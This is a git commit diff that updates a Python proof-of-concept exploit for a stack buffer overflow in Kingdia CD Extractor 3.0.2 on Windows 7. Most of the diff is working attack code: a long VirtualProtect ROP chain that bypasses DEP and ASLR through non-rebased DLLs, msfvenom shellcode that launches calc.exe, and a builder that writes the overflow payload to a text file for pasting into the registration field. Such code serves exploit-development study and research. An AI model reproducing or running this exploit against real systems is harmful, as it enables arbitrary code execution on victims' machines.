ceb12d4af37e9a2689bb1852fc376b3f6ba36523
Angelo F.C <98479572+lem0nSec@users.noreply.github.com>
2022-07-28 23:17:03 +0200

    Update Kingdia CD Extractor 3.0.2 (DEP + ASLR Bypass).py

--- CVE N\A/Kingdia CD Extractor 3.0.2 (DEP + ASLR Bypass).py
+++ CVE N\A/Kingdia CD Extractor 3.0.2 (DEP + ASLR Bypass).py
@@ -1,65 +1,29 @@
-# Title: Kingdia CD Extractor 3.0.2 - CVE N\A
-# Target binary: 'Kingdia CD Extractor.exe'
-# Target system: Windows 7 SP1
-# Stack Overflow + ROP Chain --> SkinMagic.dll, in_mad.dll
-# ExploitDB page: https://www.exploit-db.com/exploits/50470
+# Exploit Title: Kingdia CD Extractor v3.0.2 (DEP + ASLR Bypass)
+# Date: 28/07/2022
+# Exploit Author: Angelo Frasca Caccia
+# Software Link: https://en.softonic.com/download/kingdia-cd-extractor/windows/post-download
+# Version: 3.0.2
+# Tested on: Windows 7 Professional 64 bit Service Pack 1
 
-# Note that this exploit is different than the one on ExploitDB.
-# Although the ExploitDB code is an SEH overwrite and this
-# is just a basic EIP overwrite, I wanted to implemented 
-# a ROP Chain to bypass Data Execution Prevention and 
-# Address Space Layout Randomization. This was possible because 
-# the software comes with two modules that lack both ASLR and Rebasing: 
-# SkinMagic.dll and in_mad.dll.
+# NOTES ABOUT THE EXPLOIT CODE
+#------------------------------
+# Kingdia CD Extractor 3.0.2 is vulnerable to a stack-based buffer overflow.
+# The condition can be triggered when sending a large input string as registration code.
+# This exploit generates a "payload.txt". Just launch the application and press the registration
+# button. Then copy the content of the generated .txt file and paste it into the 'User Name' and 
+# 'Registration code' fields.
 
-from struct import pack
+# NOTES ABOUT THE ROP CHAIN
+#---------------------------
+# This rop chain was developed with VirtualProtect. The vulnerable application come with two
+# modules (SkinMagic.dll and in_mad.dll) which do not support Address Space Layout Randomization
+# nor are they rebased.
 
-shellcode =  b""
-shellcode += b"\xbe\xb0\xe7\xa7\xc5\xdb\xd4\xd9\x74\x24\xf4\x5a\x33"
-shellcode += b"\xc9\xb1\x31\x31\x72\x13\x83\xea\xfc\x03\x72\xbf\x05"
-shellcode += b"\x52\x39\x57\x4b\x9d\xc2\xa7\x2c\x17\x27\x96\x6c\x43"
-shellcode += b"\x23\x88\x5c\x07\x61\x24\x16\x45\x92\xbf\x5a\x42\x95"
-shellcode += b"\x08\xd0\xb4\x98\x89\x49\x84\xbb\x09\x90\xd9\x1b\x30"
-shellcode += b"\x5b\x2c\x5d\x75\x86\xdd\x0f\x2e\xcc\x70\xa0\x5b\x98"
-shellcode += b"\x48\x4b\x17\x0c\xc9\xa8\xef\x2f\xf8\x7e\x64\x76\xda"
-shellcode += b"\x81\xa9\x02\x53\x9a\xae\x2f\x2d\x11\x04\xdb\xac\xf3"
-shellcode += b"\x55\x24\x02\x3a\x5a\xd7\x5a\x7a\x5c\x08\x29\x72\x9f"
-shellcode += b"\xb5\x2a\x41\xe2\x61\xbe\x52\x44\xe1\x18\xbf\x75\x26"
-shellcode += b"\xfe\x34\x79\x83\x74\x12\x9d\x12\x58\x28\x99\x9f\x5f"
-shellcode += b"\xff\x28\xdb\x7b\xdb\x71\xbf\xe2\x7a\xdf\x6e\x1a\x9c"
-shellcode += b"\x80\xcf\xbe\xd6\x2c\x1b\xb3\xb4\x3a\xda\x41\xc3\x08"
-shellcode += b"\xdc\x59\xcc\x3c\xb5\x68\x47\xd3\xc2\x74\x82\x90\x3d"
-shellcode += b"\x3f\x8f\xb0\xd5\xe6\x45\x81\xbb\x18\xb0\xc5\xc5\x9a"
-shellcode += b"\x31\xb5\x31\x82\x33\xb0\x7e\x04\xaf\xc8\xef\xe1\xcf"
-shellcode += b"\x7f\x0f\x20\xac\x1e\x83\xa8\x1d\x85\x23\x4a\x62"
+#-----------------------------------------------START---------------------------------------------#
 
-# shellcode --> calc.exe
-# bad characters: \x00\x0a\x0d
+import struct
+import time
 
-#------------------------------------------------#
-# The following ROP Chain is a very long one.				#
-# I'm sure there's a way to develop a shorter				#
-# rop, but I just uploaded the first working poc	#
-# I developed... Why don't you try to implement		#
-# a shorter chain with VirtualAlloc?? I am sure		#
-# it's possible!!																																#
-#------------------------------------------------#
-
-'''
-ROP CHAIN with VirtualProtect
-
- EAX = ptr to &VirtualProtect()
- ECX = lpOldProtect (ptr to W address)
- EDX = NewProtect (0x40)
- EBX = dwSize
- ESP = lPAddress (automatic)
- EBP = POP (skip 4 bytes)
- ESI = ptr to JMP [EAX]
- EDI = ROP NOP (RETN)
- + PUSHAD # RETN
- + place ptr to "jmp esp" on stack, below PUSHAD
- 
-'''
 
 def generate_rop():
 
@@ -194,15 +158,14 @@ def generate_rop():
         0x1003A015,
         0x1003A015,
         0x1003A015,
-        
 
-        # set edx --> 0x40
-        0x1003a014, # pop ecx # retn
-        0x10021AB6, # random address in skinmagic.dll --> ECX HAS TO POINT TO A VALID MEMORY ADDRESS. OTHERWISE THE SECOND INSTRUCTION OF THE NEXT GADGET WILL FAIL
+        # setting EDX register --> 0x40 (PAGE EXECUTE_READWRITE)
+        0x1003a014, # POP ECX # RETN
+        0x10021AB6, # random address in skinmagic.dll --> ecx has to point to a valid memory address, otherwise the second instruction of the next gadget will likely fail
         0x1003176a, # XOR EDX,EDX # CMP EAX,DWORD PTR DS:[ECX+8] # SETG DL # MOV EAX,EDX # RETN
         0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
-        0x41414141,
-        0x41414141,
+        0x41414141, # compensate the first pop instruction
+        0x41414141, # compensate the second pop instruction
         0x10032990, # INC EDX # CLD # POP EDI # POP EBX # RETN
         0x41414141,
         0x41414141,
@@ -391,39 +354,35 @@ def generate_rop():
         0x41414141,
 
 
-        # set ebx --> dwsize
-        0x1002e38c, # pop eax # retn
+        # setting EBX register --> dwSize (0x301)
+        0x1002e38c, # POP EAX # RETN
         0xFFFFFCFF, # 0x301 to negate
         0x1001f629, # NEG EAX # RETN
         0x601ccfd1, # XCHG EAX,EBX # RETN
 
+        # setting ECX register --> lpOldProtect
+        0x1003a568, # POP ECX # RETN
+        0x1004982b, # writable location in SkinMagic.dll
 
-        # set ecx --> lpOldProtect
-        0x1003a568, # pop ecx # retn
-        0x1004982b, # writable location
+        # setting EDI register --> RETN
+        0x601de1c9, # POP EDI # RETN
+        0x1003A015, # gadget to RETN
 
-
-        # set edi --> retn
-        0x601de1c9, # pop edi # retn
-        0x1003A015, # retn
-
-
-        # set ebp --> pop ebp
-        0x10028019, # pop ebp # retn
+        # setting EBP register --> POP EBP
+        0x10028019, # POP EBP # RETN
         0x10028019,
 
-
-        # set esi --> ptr to JMP [EAX]
-        0x1002e38c, # pop eax # retn
+        # setting ESI register --> ptr to JMP [EAX]
+        0x1002e38c, # POP EAX # RETN
         0x1003b268, # ptr &VirtualProtect
         0x100369a1, # MOV EAX,DWORD PTR DS:[EAX] # RETN
         0x601d108f, # XCHG EAX,ESI # RETN
 
-        # set eax --> &VirtualProtect
-        0x1002e38c, # pop eax # retn
+        # setting EAX register --> &VirtualProtect
+        0x1002e38c, # POP EAX # RETN
         0x1003b268, # ptr &VirtualProtect
 
-        # pushad + jmp esp
+        # finalizing the chain with PUSHAD # RETN + JMP ESP
         0x601c88c0, # pushad # retn
         0x601C9D6B, # jmp esp
 
@@ -432,27 +391,49 @@ def generate_rop():
 
     chain = []
     for gadget in gadgets:
-        chain.append(pack("<I", gadget))
+        chain.append(struct.pack("<I", gadget))
     return "".join(chain)
 
 
-def exploit():
+def main():
+
+    shellcode =  b""
+    shellcode += b"\xbe\xb0\xe7\xa7\xc5\xdb\xd4\xd9\x74\x24\xf4\x5a\x33"
+    shellcode += b"\xc9\xb1\x31\x31\x72\x13\x83\xea\xfc\x03\x72\xbf\x05"
+    shellcode += b"\x52\x39\x57\x4b\x9d\xc2\xa7\x2c\x17\x27\x96\x6c\x43"
+    shellcode += b"\x23\x88\x5c\x07\x61\x24\x16\x45\x92\xbf\x5a\x42\x95"
+    shellcode += b"\x08\xd0\xb4\x98\x89\x49\x84\xbb\x09\x90\xd9\x1b\x30"
+    shellcode += b"\x5b\x2c\x5d\x75\x86\xdd\x0f\x2e\xcc\x70\xa0\x5b\x98"
+    shellcode += b"\x48\x4b\x17\x0c\xc9\xa8\xef\x2f\xf8\x7e\x64\x76\xda"
+    shellcode += b"\x81\xa9\x02\x53\x9a\xae\x2f\x2d\x11\x04\xdb\xac\xf3"
+    shellcode += b"\x55\x24\x02\x3a\x5a\xd7\x5a\x7a\x5c\x08\x29\x72\x9f"
+    shellcode += b"\xb5\x2a\x41\xe2\x61\xbe\x52\x44\xe1\x18\xbf\x75\x26"
+    shellcode += b"\xfe\x34\x79\x83\x74\x12\x9d\x12\x58\x28\x99\x9f\x5f"
+    shellcode += b"\xff\x28\xdb\x7b\xdb\x71\xbf\xe2\x7a\xdf\x6e\x1a\x9c"
+    shellcode += b"\x80\xcf\xbe\xd6\x2c\x1b\xb3\xb4\x3a\xda\x41\xc3\x08"
+    shellcode += b"\xdc\x59\xcc\x3c\xb5\x68\x47\xd3\xc2\x74\x82\x90\x3d"
+    shellcode += b"\x3f\x8f\xb0\xd5\xe6\x45\x81\xbb\x18\xb0\xc5\xc5\x9a"
+    shellcode += b"\x31\xb5\x31\x82\x33\xb0\x7e\x04\xaf\xc8\xef\xe1\xcf"
+    shellcode += b"\x7f\x0f\x20\xac\x1e\x83\xa8\x1d\x85\x23\x4a\x62"
+    # msfvenom -p windows/exec cmd=calc.exe -a x86 -b "\x00\x0a\x0d" -f python
+    # bad characters: \x00\x0a\x0d
 
     rop_chain = generate_rop()
     
     payload = "A"*268
-    payload += pack("<I", 0x1003A015)	# RETN --> SkinMagic.dll 
+    payload += struct.pack("<I", 0x1003A015)    # RETN --> SkinMagic.dll 
     payload += rop_chain
     payload += "\x90"*8
     payload += shellcode
 
-    f = open("sendme.txt", "w")
+    print "[+] Dropping payload.txt..."
+    time.sleep(1)
+    f = open("payload.txt", "w")
     f.write(payload)
     f.close()
 
-def main():
-    exploit()
 
 if __name__ == "__main__":
     main()
-    
+  
+#-----------------------------------------------END---------------------------------------------#
